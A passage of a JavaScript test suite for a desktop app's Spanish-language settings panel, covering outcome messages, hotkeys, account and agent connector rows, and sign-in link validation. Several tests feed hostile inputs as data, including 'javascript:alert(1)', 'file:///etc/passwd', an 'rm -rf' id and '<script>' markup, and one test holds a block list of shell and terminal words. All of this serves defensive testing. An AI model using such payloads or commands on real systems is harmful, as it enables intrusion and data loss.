const ac = (code, n, extra = {}) => ({ ...state({ connection: 'connected' }), last_error: { code, n }, ...extra });
test('outcome: success is announced only when no engine error arrived after the command', () => {
  const sent = ac(null, 0);
  assert.deepEqual(S.commandOutcome(sent, ac(null, 0), 'Cuenta Casa creada.'), { ok: true, say: 'Cuenta Casa creada.' });
  // an error that arrived while the command was in flight (same state otherwise)
  for (const [code, word] of [['failed', 'No se pudo'], ['busy', 'Motor ocupado'], ['bad_request', 'Pedido no válido'], ['rate_limited', 'Demasiados pedidos']]) {
    const r = S.commandOutcome(ac(null, 0), ac(code, 1), 'Cuenta Casa creada.');
    assert.equal(r.ok, false, code);
    assert.equal(r.word, word, code);
    assert.ok(r.icon && r.tone, code);
    assert.ok(!r.say.includes('creada'), `${code}: the success text is never said (${r.say})`);
    assert.ok(r.say.includes(word), code);
  }
  // HU-061: a non-private credential store (Windows) tells the human WHAT TO DO, in the app's language
  const sn = S.commandOutcome(ac(null, 0), ac('store_not_private', 1), 'Cuenta Casa creada.');
  assert.equal(sn.ok, false);
  assert.equal(sn.say, 'Los archivos de tu cuenta no son privados en este equipo. Quitá la cuenta y volvé a iniciar sesión.');
  // the SAME code twice is a new event: the counter decides
  assert.equal(S.commandOutcome(ac('failed', 4), ac('failed', 5), 'x').ok, false);
  assert.equal(S.commandOutcome(ac('failed', 4), ac('failed', 4), 'x.').ok, true, 'an old error is not this command\'s');
  // no engine / lost connection after the command: no success either
  assert.equal(S.commandOutcome(ac(null, 0), state({ connection: 'lost' }), 'Hecho.').ok, false);
  assert.equal(S.commandOutcome(null, null, 'Hecho.').ok, false);
  // an unknown code reads as the generic failure, never as text
  assert.equal(S.commandOutcome(ac(null, 0), ac('<b>x</b>', 1), 'Hecho.').word, 'No se pudo');
});

test('hotkey: «cambiado» only when the backend really took it; taken/invalid/denied say so', () => {
  const view = (status, extra = {}) => ({ combo: 'Ctrl+Alt+K', enabled: true, status, backend: 'x11', ...extra });
  assert.deepEqual(S.hotkeySetOutcome(view('active'), 'Ctrl+Alt+K'), { ok: true, say: 'Atajo cambiado a Ctrl+Alt+K.' });
  assert.equal(S.hotkeySetOutcome(view('taken'), 'Ctrl+Alt+K').ok, false);
  assert.match(S.hotkeySetOutcome(view('taken'), 'Ctrl+Alt+K').say, /ocupado/i);
  assert.match(S.hotkeySetOutcome(view('invalid'), 'Ctrl+Alt+K').say, /inválido/i);
  assert.match(S.hotkeySetOutcome(view('unsupported'), 'Ctrl+Alt+K').say, /soporte/i);
  assert.match(S.hotkeySetOutcome(view('permission_denied'), 'Ctrl+Alt+K').say, /permiso/i);
  for (const status of ['taken', 'invalid', 'unsupported', 'permission_denied']) assert.ok(!/cambiado/i.test(S.hotkeySetOutcome(view(status), 'Ctrl+Alt+K').say), status);
  // portal: the OS dialog is still open — not changed yet, not failed either
  const pending = S.hotkeySetOutcome(view('permission_pending', { backend: 'portal' }), 'Ctrl+Alt+K');
  assert.equal(pending.ok, null);
  assert.match(pending.say, /confirm|permiso|sistema/i);
  assert.ok(!/cambiado/i.test(pending.say));
  // the combo shown is the one the backend reports, not what was typed
  assert.equal(S.hotkeySetOutcome(view('active', { combo: 'Ctrl+Alt+J' }), 'Ctrl+Alt+K').say, 'Atajo cambiado a Ctrl+Alt+J.');
  assert.equal(S.hotkeySetOutcome(null, 'Ctrl+Alt+K').ok, false);
});

test('draft: what the human typed survives a re-render and never leaks into the next form', () => {
  const d = S.makeDrafts();
  assert.equal(d.get('settings-secret'), '');
  d.set('settings-secret', 'sk-abc');
  assert.equal(d.get('settings-secret'), 'sk-abc');
  d.clear('settings-secret');
  assert.equal(d.get('settings-secret'), '', 'cleared the moment it is sent');
  // a different prompt is a different form: the old key is NOT carried into it
  d.scope('flow-1'); d.set('settings-secret', 'sk-old'); d.scope('flow-1');
  assert.equal(d.get('settings-secret'), 'sk-old', 'same scope: kept');
  d.scope('flow-2');
  assert.equal(d.get('settings-secret'), '', 'a new prompt starts empty');
  d.set('settings-secret', 'sk-new'); d.reset();
  assert.equal(d.get('settings-secret'), '');
});

test('wiring: the motion switch, the clear-on-send of the secret and the draft are wired (source contract)', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  // motion: switch -> exactly one of the two backend calls, then the REAL answer drives the label
  assert.match(src, /sw-motion/);
  assert.match(src, /g\.motion\.respectSystem \? window\.desktop\.animateAnyway\(\) : window\.desktop\.respectSystemMotion\(\)/);
  assert.match(src, /motionOverride = s\.motionOverride !== false/);
  // the secret field: draft kept across renders, wiped at send, never rendered back
  assert.match(src, /drafts\.set\('settings-secret'/);
  assert.match(src, /drafts\.clear\('settings-secret'\)/);
  assert.doesNotMatch(src, /createDraft[^\n]*secret/);
  // no success text is said before the engine answered
  assert.doesNotMatch(src, /agent\(payload\)\.then\(next => \{ busy = false; applyAgent\(next\); if \(okSay\) say\(okSay\)/);
  assert.match(src, /commandOutcome\(/);
  assert.match(src, /hotkeySetOutcome\(/);
});

test('#421 eventView validates like the host: https only, <=2000, no whitespace/control/credentials, else rejected', () => {
  const ok = S.eventView({ url: 'https://auth.example.com/device?c=1' });
  assert.equal(ok.link, 'https://auth.example.com/device?c=1'); assert.equal(ok.linkRejected, false);
  assert.equal(S.eventView({ verificationUri: 'https://a.example/x' }).link, 'https://a.example/x');
  for (const bad of ['http://a.example/x', 'javascript:alert(1)', 'file:///etc/passwd', 'https://u:p@a.example/', 'https://a.example/ x', 'https://a.example/\u0007', 'https://' + 'a'.repeat(2000) + '.com', 'not a url']) {
    const v = S.eventView({ url: bad });
    assert.equal(v.link, null, bad); assert.equal(v.linkRejected, true, bad);
  }
  assert.equal(S.eventView({ message: 'x' }).linkRejected, false);
});

test('#421 the sign-in link is a real anchor routed through open_chat_url, never navigating the webview (source contract)', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  const flow = src.slice(src.indexOf('function renderFlow'), src.indexOf('function reply'));
  assert.match(flow, /el\('a', 'slink'/, 'the link is an <a>, not plain text');
  assert.match(flow, /setAttribute\('href', '#'\)/, 'href never carries the remote URL: the webview cannot navigate away');
  assert.match(flow, /invoke\('open_chat_url', \{ payload: \{ url: eventV\.link \} \}\)/, 'opens through the validated host command');
  assert.match(flow, /preventDefault\(\)/, 'the default navigation is always cancelled');
  assert.match(flow, /addEventListener\('auxclick'/, 'middle click opens too');
  assert.match(flow, /addEventListener\('contextmenu'/, 'context-menu open is cancelled too');
  assert.doesNotMatch(flow, /\.href\s*=|setAttribute\('href', eventV/, 'the remote URL never reaches href');
  assert.match(flow, /linkRejected/, 'a rejected URL gets a plain fallback');
  assert.match(flow, /e\.isTrusted === true/, 'only trusted gestures open');
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
  assert.ok(css.indexOf('.slink') >= 0 && css.indexOf('.slink') < css.indexOf('#410'), 'style rule lives before the #410 compact block');
});

// ---- cheap UX defects found by the verifier -----------------------------------------------------
// CSS specificity as (ids, classes+attributes+pseudo, types), enough for the selectors used here.
const specificity = sel => {
  const ids = (sel.match(/#[\w-]+/g) || []).length;
  const attrs = (sel.match(/\[[^\]]+\]/g) || []).length + (sel.match(/:(?!not\b)[\w-]+/g) || []).length;
  const negated = (sel.match(/:not\(([^)]*)\)/g) || []).map(n => specificity(n.slice(5, -1)));
  const sum = negated.reduce((a, b) => [a[0] + b[0], a[1] + b[1]], [0, 0]);
  return [ids + sum[0], attrs + sum[1]];
};
const cmp = (a, b) => a[0] - b[0] || a[1] - b[1];
test('style (S10 L22): the gear is shown in the overview and NO rule hides it for a card or a pending question (Coucou shows its header everywhere)', () => {
  const css = fs.readFileSync(path.join(__dirname, '..', 'frontend', 'style.css'), 'utf8').replace(/\/\*[\s\S]*?\*\//g, '');
  const rules = [...css.matchAll(/(^|\n)([^{}\n][^{}]*#open-settings[^{}]*)\{([^}]*)\}/g)].map(m => ({ sel: m[2].trim(), body: m[3] }));
  assert.ok(rules.some(r => /visibility:\s*visible/.test(r.body)), 'the shown rule exists');
  assert.equal(rules.filter(r => /visibility:\s*hidden/.test(r.body) && /\[data-(card|question)/.test(r.sel)).length, 0, 'no card/question hide rule');
  const header = css.match(/#capsule\[data-phase="expanded"\] #island-header \{[^}]*\}/);
  assert.ok(header && /visibility:\s*visible/.test(header[0]), 'the header itself is visible whenever the island is expanded');
});

test('focus: closing the panel by keyboard lands on the chat-header gear, which stays visible in the CHAT view (#408; #open-settings is overview-only)', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  const close = src.slice(src.indexOf('function close('), src.indexOf('const isOpen'));
  assert.match(close, /open-screen-settings/, 'focus goes back to the gear that opened Ajustes');
  assert.doesNotMatch(close, /AbitoFocusHome/);
});

test('layout: a screen scrolls inside its own body, so the close bar is always inside even in the shortest column (240)', () => {
  const css = fs.readFileSync(path.join(__dirname, '..', 'frontend', 'style.css'), 'utf8').replace(/\/\*[\s\S]*?\*\//g, '');
  const px = (re, d) => { const m = css.match(re); return m ? Number(m[1]) : d; };
  assert.match(css.match(/#settings-body \{([^}]*)\}/)[1], /overflow-y:\s*auto/);
  assert.match(css.match(/#settings-body \{([^}]*)\}/)[1], /min-height:\s*0/);
  const win = 256 /* shortest native window: CHAT_MIN_H 240 + margins */, top = px(/#settings \{[^}]*top:\s*(\d+)px/, 8), bottom = px(/#settings \{[^}]*bottom:\s*(\d+)px/, 8);
  const bar = px(/#settings-bar \{[^}]*min-height:\s*(\d+)px/, 44);
  assert.ok(win - top - bottom >= bar + 44, `the panel (${win - top - bottom}px) must hold the bar and at least one row`);
});

// ---- Cuentas: connected list, two method cards, provider list with search (gentle-dot AccountsPanel) ----
const st2 = (extra = {}) => state({ providers: [
  { id: 'anthropic', name: 'Anthropic', methods: ['api_key', 'oauth'], configured: true },
  { id: 'openai', name: 'OpenAI', methods: ['oauth'], configured: false },
  { id: 'groq', name: 'Groq', methods: ['api_key'], configured: false }], ...extra });

test('accounts: two method cards, in gentle-dot wording', () => {
  assert.deepEqual(S.METHOD_CARDS.map(c => c.id), ['oauth', 'api_key']);
  assert.equal(S.METHOD_CARDS[0].title, 'Usar una suscripción');
  assert.equal(S.METHOD_CARDS[1].title, 'Usar una clave de API');
  // T7.2 copy diet: the method cards draw titles only (design shows no method-card hints).
  for (const c of S.METHOD_CARDS) assert.equal(c.hint, undefined);
});

test('accounts: the provider list is filtered by method and by the search box', () => {
  const ids = (m, f) => S.providerList(st2(), m, f).map(p => p.id);
  assert.deepEqual(ids('oauth', ''), ['anthropic', 'openai']);
  assert.deepEqual(ids('api_key', ''), ['anthropic', 'groq']);
  assert.deepEqual(ids('api_key', '  GRO '), ['groq'], 'case-insensitive, trimmed');
  assert.deepEqual(ids('api_key', 'zzz'), []);
  assert.deepEqual(ids('weird', ''), [], 'an unknown method lists nothing');
  const row = S.providerList(st2(), 'oauth', '')[0];
  assert.equal(row.name, 'Anthropic'); assert.equal(row.connected, true);
  assert.equal(S.providerList(st2(), 'oauth', '')[1].connected, false);
  assert.equal(S.providerList(st2(), 'oauth', '')[0].actionLabel, 'Iniciar sesión');
  assert.equal(S.providerList(st2(), 'api_key', '')[0].actionLabel, 'Usar una clave de API');
});

// ---- #410 round 2: the compact provider LIST — one row per provider, two buttons: API / Auth -------

test('#410 rows: one row per provider, in the engine\'s order, with OUR names and the honest status', () => {
  const rows = S.providerRows(st2(), {});
  assert.deepEqual(rows.map(r => r.id), ['anthropic', 'openai', 'groq']);
  assert.deepEqual([rows[0].name, rows[1].name, rows[2].name], ['Anthropic', 'OpenAI', 'Groq']);
  assert.deepEqual([rows[1].status.kind, rows[1].status.word, rows[1].status.tone], ['idle', 'No conectado', 'faint']);
});

test('#410 rows: the two connect buttons read exactly «API» and «Auth», only for a method the provider offers', () => {
  const [, openai, groq] = S.providerRows(st2(), {});
  assert.deepEqual([openai.api, openai.auth.word, openai.auth.method], [null, 'Auth', 'oauth'], 'no API method, no API button');
  assert.deepEqual([groq.auth, groq.api.word, groq.api.method], [null, 'API', 'api_key'], 'no oauth method, no Auth button');
  const both = S.providerRows(st2({ providers: [{ id: 'newco', name: 'NewCo', methods: ['api_key', 'oauth'], configured: false }] }), {})[0];
  assert.deepEqual([both.api.word, both.api.method, both.auth.word, both.auth.method], ['API', 'api_key', 'Auth', 'oauth']);
  for (const b of [both.api, both.auth, openai.auth, groq.api]) assert.ok(b.aria.includes('NewCo') || b.aria.includes('OpenAI') || b.aria.includes('Groq'), 'each button names its provider for the screen reader');
  // a provider without methods does not exist in the list (nothing to connect with)
  assert.deepEqual(S.providerRows(st2({ providers: [{ id: 'x', name: 'X', methods: [], configured: false }] }), {}), []);
});

test('#410 rows: a connected row offers NO connect buttons, only «Cerrar sesión»; an unconnected one has no logout', () => {
  const [anthropic, openai] = S.providerRows(st2(), {});
  assert.deepEqual([anthropic.api, anthropic.auth, anthropic.logout], [null, null, true]);
  assert.deepEqual([anthropic.status.kind, anthropic.status.word, anthropic.status.tone], ['connected', 'Conectado', 'go']);
  assert.equal(openai.logout, false);
});

test('#410 rows: buttons need a login plan — no engine disables them, a working one does not', () => {
  assert.equal(S.providerRows(st2({ connection: 'no_daemon' }), {})[1].auth.disabled, true, 'no engine, no login');
  assert.equal(S.providerRows(st2({ connection: 'no_daemon' }), {})[2].api.disabled, true, 'no engine, no key');
  assert.equal(S.providerRows(st2(), {})[1].auth.disabled, false);
});

test('#410 rows: a live login collapses its row to «Cancelar»; no other row can start a second flow', () => {
  const rows = S.providerRows(st2(), { flow: { providerId: 'openai', phase: 'active' } });
  assert.deepEqual([rows[1].status.kind, rows[1].status.word, rows[1].status.icon], ['progress', 'En curso', 'ring']);
  assert.deepEqual([rows[1].api, rows[1].auth], [null, null], 'no second connect while the flow runs');
  assert.equal(rows[1].cancel.word, 'Cancelar');
  assert.equal(rows[1].cancel.method, undefined, 'cancel carries no login method');
  assert.equal(rows[1].logout, false);
  assert.deepEqual([rows[0].api, rows[0].auth], [null, null], 'a connected row keeps no connect buttons');
  assert.equal(rows[0].logout, true, 'others keep their own state');
  assert.equal(rows[2].api.disabled, true, 'no second flow at once');
  assert.equal(rows[2].cancel, null);
});

test('#410 rows: an error stays on the row that caused it, in OUR words; the same buttons retry; the cancel note too', () => {
  const rows = S.providerRows(st2(), { flow: { providerId: 'groq', phase: 'error', detail: 'sk-secret-123 stack trace' } });
  assert.deepEqual([rows[2].status.kind, rows[2].status.word, rows[2].status.tone], ['error', 'Error', 'red']);
  assert.match(rows[2].error, /No se pudo iniciar sesión/);
  assert.equal(rows[0].error, '', 'only the target shows the error');
  assert.equal(rows[2].api.word, 'API', 'the retry is the same button, not a new wording');
  assert.ok(!JSON.stringify(rows).includes('sk-secret'), 'engine detail is never rendered');
  const cancelled = S.providerRows(st2(), { flow: { providerId: 'groq', phase: 'cancelled' } });
  assert.equal(cancelled[2].status.kind, 'idle');
  assert.match(cancelled[2].note, /Cancelado/);
});

test('#410 rows: the search narrows the list; the method filter is gone from the contract', () => {
  assert.deepEqual(S.providerRows(st2(), { filter: ' GRO ' }).map(r => r.id), ['groq'], 'case-insensitive, trimmed');
  assert.deepEqual(S.providerRows(st2(), { filter: 'zzz' }), []);
  assert.equal(S.providerRows(st2(), { filter: '' }).length, 3);
});

test('accounts: «Iniciar sesión» uses the provider\'s account, or creates one named after the provider first', () => {
  const have = S.loginPlan(st2(), 'anthropic', 'oauth');
  assert.deepEqual(have, { kind: 'start', accountId: 'personal', method: 'oauth' });
  const none = S.loginPlan(st2(), 'groq', 'api_key');
  assert.deepEqual(none, { kind: 'create', provider: 'groq', label: 'Groq', method: 'api_key' });
  assert.equal(S.loginPlan(st2(), 'groq', 'oauth'), null, 'a method the provider does not offer');
  assert.equal(S.loginPlan(st2(), 'nope', 'oauth'), null);
  assert.equal(S.loginPlan(st2({ connection: 'no_daemon' }), 'groq', 'api_key'), null, 'no engine, no login');
  // a hostile provider name never becomes a label with control characters
  const hostile = st2({ providers: [{ id: 'evil', name: 'Ev\nil' + 'x'.repeat(200), methods: ['api_key'], configured: false }] });
  const plan = S.loginPlan(hostile, 'evil', 'api_key');
  assert.equal(plan.kind, 'create');
  assert.ok(!/[\u0000-\u001f]/.test(plan.label) && Array.from(plan.label).length <= 80);
});

test('accounts: after creating, the login starts as soon as the NEW account appears (never one that already existed)', () => {
  const pending = S.pendingLogin(st2(), 'groq', 'api_key');
  assert.deepEqual(pending.known, ['personal', 'work', 'lmstudio']);
  assert.equal(S.pendingLoginReady(st2(), pending), null, 'nothing new yet');
  const after = st2({ accounts: [...st2().accounts, { accountId: 'groq-1', label: 'Groq', provider: 'groq', authMethod: 'none', configured: false }] });
  assert.deepEqual(S.pendingLoginReady(after, pending), { accountId: 'groq-1', method: 'api_key' });
  const other = st2({ accounts: [...st2().accounts, { accountId: 'x', label: 'X', provider: 'openai', authMethod: 'none', configured: false }] });
  assert.equal(S.pendingLoginReady(other, pending), null, 'a new account of ANOTHER provider is not ours');
});

test('accounts: the connected list shows only signed-in accounts, with «Salir»', () => {
  const rows = S.connectedAccounts(st2());
  assert.ok(rows.every(r => r.signedIn || r.local));
  assert.ok(rows.find(r => r.accountId === 'personal'));
  assert.equal(rows.find(r => r.accountId === 'work'), undefined, 'a signed-out account is not «Conectada»');
});

// ---- Conectores: agents (one click, no terminal) + services ----------------------------------------
const agentsState = (list, extra = {}) => state({ agents: list, ...extra });
test('agents: known agents, names from OUR table, never from the engine payload', () => {
  assert.deepEqual(S.AGENT_IDS, ['pi', 'claude-code', 'codex', 'copilot-cli', 'opencode', 'recap', 'statusline']);
  const v = S.agentsView(agentsState([{ id: 'claude-code', name: '<b>pwn</b>', state: 'not_connected', backup: false, detail: null }]));
  assert.equal(v.kind, 'ready');
  assert.equal(v.rows[0].name, 'Claude Code');
  // #436 D7: the design shows ALL SIX clients (was ['claude-code'] only); the engine row keeps its place
  assert.deepEqual(v.rows.map(r => r.id), ['claude-code', 'codex', 'gemini-cli', 'copilot-cli', 'opencode', 'amp', 'cursor']);
  // an id outside the allowlist is dropped, a duplicate keeps the first
  const odd = S.agentsView(agentsState([{ id: 'rm -rf', state: 'connected' }, { id: 'codex', state: 'connected' }, { id: 'codex', state: 'error' }]));
  assert.deepEqual(odd.rows.filter(r => r.state !== 'unknown').map(r => r.id), ['codex']);
  assert.equal(odd.rows[0].state, 'unknown', 'no invented state for an engine that says nothing');
  assert.equal(odd.rows.find(r => r.id === 'codex').state, 'connected');
});

test('agents: each state is icon + one word with the right button — «Agregar hooks», «Actualizar», «Desconectar» — never a terminal', () => {
  // #436 D7: rows render in the design's closed six-order, so tests pick their row by id
  const row = (state, extra = {}) => S.agentsView(agentsState([{ id: 'codex', state, backup: false, detail: null, plan_hash: 'b'.repeat(64), summary: 'Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first.', reviewable: true, ...extra }])).rows.find(r => r.id === 'codex');
  const nc = row('not_connected');
  // #436 design: the connect word is «Agregar hooks» (was «Conectar»)
  assert.deepEqual([nc.word, nc.tone, nc.primary && nc.primary.label], ['Sin conectar', 'faint', 'Agregar hooks']);
  assert.deepEqual(nc.primary.command, { action: 'agent_connect', agentId: 'codex', plan_hash: 'b'.repeat(64) });
  assert.equal(nc.secondary, null);
  const ok = row('connected');
  assert.deepEqual([ok.word, ok.tone, ok.primary], ['Conectado', 'go', null]);
  assert.deepEqual(ok.secondary, { label: 'Desconectar', command: { action: 'agent_disconnect', agentId: 'codex' } });
  const old = row('outdated');
  assert.equal(old.primary.label, 'Actualizar'); assert.equal(old.primary.command.action, 'agent_connect'); assert.equal(old.primary.command.plan_hash, 'b'.repeat(64)); assert.equal(old.secondary.label, 'Desconectar');
  const work = row('working');
  assert.deepEqual([work.word, work.primary, work.secondary, work.busy], ['En curso', null, null, true]);
  const gone = row('unavailable');
  assert.deepEqual([gone.word, gone.primary, gone.secondary], ['No encontrado', null, null]);
  assert.match(gone.note, /no está instalad/i);
  const bad = row('error', { detail: 'not_writable' });
  assert.equal(bad.word, 'No se pudo'); assert.equal(bad.tone, 'red'); assert.equal(bad.primary.label, 'Reintentar');
  assert.match(bad.note, /permiso/i);
  assert.match(row('error', { detail: 'backup_failed' }).note, /respaldo/i);
  assert.match(row('error', { detail: 'config_invalid' }).note, /config/i);
  assert.ok(row('error', { detail: '<script>' }).note.length > 5, 'an unknown detail reads as a generic sentence, never as text');
  assert.ok(!/<script>/.test(row('error', { detail: '<script>' }).note));
  // a hostile state value is an error, not a free-form chip
  assert.equal(row('<img>').state, 'error');
  assert.ok(!/terminal|comando|consola/i.test(JSON.stringify([nc, ok, old, work, gone, bad])), 'no word asks the human to use a terminal');
});

test('agents: a backup is mentioned when there is one; the list is honest without an engine', () => {
  const ok = S.agentsView(agentsState([{ id: 'claude-code', state: 'connected', backup: true, detail: null }])).rows[0];
  assert.equal(ok.note, 'Con respaldo.'); // #436 design: the design's own subtitle (was a full sentence)
  assert.equal(S.agentsView(state({ connection: 'no_daemon', agents: null })).kind, 'no_engine');
  assert.equal(S.agentsView(state({ connection: 'connected', agents: null })).kind, 'loading');
  assert.equal(S.agentsView(agentsState([])).kind, 'ready');
  // #436 D7: an engine frame that names nobody leaves all SIX rows honestly unknown (was 0 rows)
  assert.equal(S.agentsView(agentsState([])).rows.length, 7);
  assert.ok(S.agentsView(agentsState([])).rows.every(r => r.word === 'No disponible' && !r.primary && !r.secondary));
});

// ---- #436 T6.5 (D7): SIX honest rows — real state where known, «No disponible» where not -----------
const hooksState = (clients, extra = {}) => state({ agents: null, hooks: clients, ...extra });
test('agents: all SIX clients render, in our closed order, with names derived from OUR ids', () => {
  const v = S.agentsView(agentsState([{ id: 'claude-code', state: 'connected', backup: false, detail: null }]));
  assert.equal(v.kind, 'ready');
  assert.deepEqual(v.rows.map(r => r.id), ['claude-code', 'codex', 'gemini-cli', 'copilot-cli', 'opencode', 'amp', 'cursor']);
  assert.deepEqual(v.rows.map(r => r.name), ['Claude Code', 'Codex', 'Gemini CLI', 'Copilot CLI', 'OpenCode', 'Amp', 'Cursor']);
  // Pi adds an installable row; unsupported hook-only rows still have no button.
  assert.deepEqual(S.AGENT_IDS, ['pi', 'claude-code', 'codex', 'copilot-cli', 'opencode', 'recap', 'statusline']);
  const extras = v.rows.filter(r => !S.AGENT_IDS.includes(r.id));
  assert.ok(extras.every(r => r.primary === null && r.secondary === null), 'state-only rows, no dead buttons');
});

test('agents: the daemon hooks frame fills the rows the engine agents frame does not name, state-only', () => {
  const v = S.agentsView(state({
    agents: [{ id: 'codex', state: 'connected', backup: false, detail: null }],
    hooks: [
      { id: 'claude-code', state: 'connected', mechanism: 'harness', detail: null, backup: true },
      { id: 'gemini-cli', state: 'not_connected', mechanism: 'artifact', detail: null },
      { id: 'copilot-cli', state: 'unavailable', mechanism: 'artifact', detail: null },
      { id: 'amp', state: 'error', mechanism: 'artifact', detail: 'unsupported_platform' },
    ],
  }));
  assert.equal(v.kind, 'ready');
  const byId = Object.fromEntries(v.rows.map(r => [r.id, r]));
  // the engine agents frame wins for the id it names (buttons live there)
  assert.equal(byId['codex'].word, 'Conectado');
  assert.equal(byId['codex'].secondary.label, 'Desconectar');
  // hooks-derived rows: honest words, no buttons
  assert.deepEqual([byId['gemini-cli'].word, byId['gemini-cli'].tone], ['Sin conectar', 'faint']);
  assert.deepEqual([byId['copilot-cli'].word, byId['copilot-cli'].tone], ['Sin instalar', 'faint']);
  assert.deepEqual([byId['amp'].word, byId['amp'].tone], ['No se pudo', 'red']);
  assert.ok(byId['gemini-cli'].primary === null && byId['gemini-cli'].secondary === null);
  assert.match(byId['claude-code'].note, /Con respaldo/);
  assert.equal(byId['claude-code'].primary, null, 'a hooks-only row never offers a button, even connected with backup');
});

test('agents: hooks-only knowledge renders without an agents frame, and working reads «En curso»', () => {
  const v = S.agentsView(hooksState([
    { id: 'gemini-cli', state: 'working', mechanism: 'artifact', detail: null },
    { id: 'amp', state: 'outdated', mechanism: 'artifact', detail: null },
  ]));
  assert.equal(v.kind, 'ready', 'hooks data is enough; no endless wait');
  const byId = Object.fromEntries(v.rows.map(r => [r.id, r]));
  assert.equal(byId['gemini-cli'].word, 'En curso');
  assert.equal(byId['amp'].word, 'Desactualizado');
  assert.equal(byId['claude-code'].word, 'No disponible', 'nothing is known about it: no invented state');
  assert.equal(byId['claude-code'].primary, null);
});

test('agents: with neither frame the wait and the honest «No disponible» verdicts are unchanged', () => {
  assert.equal(S.agentsView(state({ agents: null, hooks: null })).kind, 'loading');
  const gone = S.agentsView(state({ agents: null, hooks: null, last_error: { code: 'bad_request', n: 3 } }), { askedAtError: 2 });
  assert.equal(gone.kind, 'unsupported');
  assert.equal(gone.word, 'No disponible');
});

// ---- verdict settings-gd ---------------------------------------------------------------------------------
test('agents: an engine that does not know agents_list ends the wait honestly — never an endless ring', () => {
  const noFrame = state({ agents: null, last_error: { code: null, n: 0 } });
  assert.equal(S.agentsView(noFrame).kind, 'loading', 'before anything was asked it is a real wait');
  // the engine of TODAY answers agents_list with error{bad_request}: that is «no disponible», not a spinner
  for (const code of ['bad_request', 'unavailable']) {
    const v = S.agentsView(state({ agents: null, last_error: { code, n: 3 } }), { askedAtError: 2 });
    assert.equal(v.kind, 'unsupported', code);
    assert.equal(v.word, 'No disponible'); assert.equal(v.note, 'El motor todavía no puede conectar agentes.');
    assert.ok(v.icon && v.icon !== 'ring', 'no ring');
  }
  // an error that arrived BEFORE the question does not count; the same counter means no new error
  assert.equal(S.agentsView(state({ agents: null, last_error: { code: 'bad_request', n: 3 } }), { askedAtError: 3 }).kind, 'loading');
  // other errors (busy, rate_limited...) are not «unsupported»
  assert.equal(S.agentsView(state({ agents: null, last_error: { code: 'busy', n: 5 } }), { askedAtError: 2 }).kind, 'loading');
  // a real frame always wins
  assert.equal(S.agentsView(state({ agents: [], last_error: { code: 'bad_request', n: 9 } }), { askedAtError: 2 }).kind, 'ready');
  // silence: no frame within the deadline is the same honest answer
  assert.equal(S.agentsView(noFrame, { timedOut: true }).kind, 'unsupported');
  assert.equal(S.agentsView(state({ agents: [{ id: 'codex', state: 'connected' }] }), { timedOut: true }).kind, 'ready');
});

test('agents: the deadline for the engine to answer is a named constant', () => {
  assert.ok(Number.isInteger(S.AGENTS_WAIT_MS) && S.AGENTS_WAIT_MS >= 2000 && S.AGENTS_WAIT_MS <= 10000);
});

test('settings never asks for a terminal except the explicitly requested missing-Pi install advice', () => {
  const strip = t => t.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
  const literals = text => [...strip(text).matchAll(/(['"`])((?:\\.|(?!\1)[^\\\n])*)\1/g)].map(m => m[2]).filter(x => /[a-záéíóúñ]{3,}/i.test(x));
  const bad = /\b(terminal|consola|l[ií]nea de comandos|comando|shell|bash|cli|sudo|npm|install)\b/i;
  // #436 D7: the closed hook client ids and the product word are NAMES of clients the design
  // draws (Gemini CLI, Copilot CLI), not instructions to open a terminal; the guard keeps
  // watching every other fixed string.
  const CLIENT_NAMES = new Set(['claude-code', 'codex', 'opencode', 'gemini-cli', 'copilot-cli', 'Copilot CLI', 'amp', 'cursor', 'CLI']);
  // S2: the owner explicitly requests how to install the missing runtime.
  // Exempt only that exact advice, not arbitrary commands elsewhere.
  const PI_INSTALL_ADVICE = 'instalalo con npm install -g @earendil-works/pi-coding-agent.';
  const where = [];
  for (const f of ['settings.js', 'settings-view.js']) {
    for (const lit of literals(fs.readFileSync(path.join(frontend, f), 'utf8'))) if (bad.test(lit) && !/^(agent_|abito:|settings|agents_)/.test(lit) && !CLIENT_NAMES.has(lit) && !(f === 'settings-view.js' && lit === PI_INSTALL_ADVICE)) where.push(`${f}: ${lit}`);
  }
  const html = fs.readFileSync(path.join(frontend, 'index.html'), 'utf8');
  const sect = html.slice(html.indexOf('id="settings"'), html.indexOf('id="chat-live"'));
  for (const m of sect.matchAll(/(?:aria-label|title|placeholder)="([^"]*)"/g)) if (bad.test(m[1])) where.push(`index.html: ${m[1]}`);
  assert.deepEqual(where, [], 'a fixed string mentions a terminal or a command');
});

test('copy: voseo everywhere (the human writes in Rioplatense Spanish)', () => {
  const all = JSON.stringify(S.TABS) + fs.readFileSync(path.join(frontend, 'settings-view.js'), 'utf8') + fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.doesNotMatch(all, /Pregunta antes/, '«Pregunta» (tú) -> «Preguntá» (vos)');
  assert.doesNotMatch(all, /\b(Conecta|Pega|Inicia|Introduce|Elige|Haz|Pulsa|Escribe)\b(?= [a-zñáéíóú])/, 'no tú imperatives');
});

test('verbs follow gentle-dot: «Cerrar sesión» for an account (its Sign out), «Desconectar» for an agent (its Disconnect)', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.doesNotMatch(src, /wordBtn\('Salir'/, 'no «Salir» button');
  assert.match(src, /wordBtn\(V\.LOGOUT_WORD/, 'the button takes its word from the one constant');
  assert.equal(S.LOGOUT_WORD, 'Cerrar sesión');
  assert.equal(S.agentsView(agentsState([{ id: 'codex', state: 'connected' }])).rows.find(r => r.id === 'codex').secondary.label, 'Desconectar');
});

test('close glyph: the screen closes with a cross (gentle-dot ×), never the ✓ that means «allow» in our vocabulary', () => {
  const html = fs.readFileSync(path.join(frontend, 'index.html'), 'utf8');
  const tag = /<button[^>]*id="settings-close"[^>]*>.*?<\/button>/.exec(html);
  assert.ok(tag);
  assert.match(tag[0], /data-icon="cross"/);
  assert.doesNotMatch(tag[0], /data-icon="check"/);
  assert.match(tag[0], /aria-label="Cerrar/);
});

test('chat header: stays visible with a screen open so the human can switch screens with the pointer', () => {
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8').replace(/\/\*[\s\S]*?\*\//g, '');
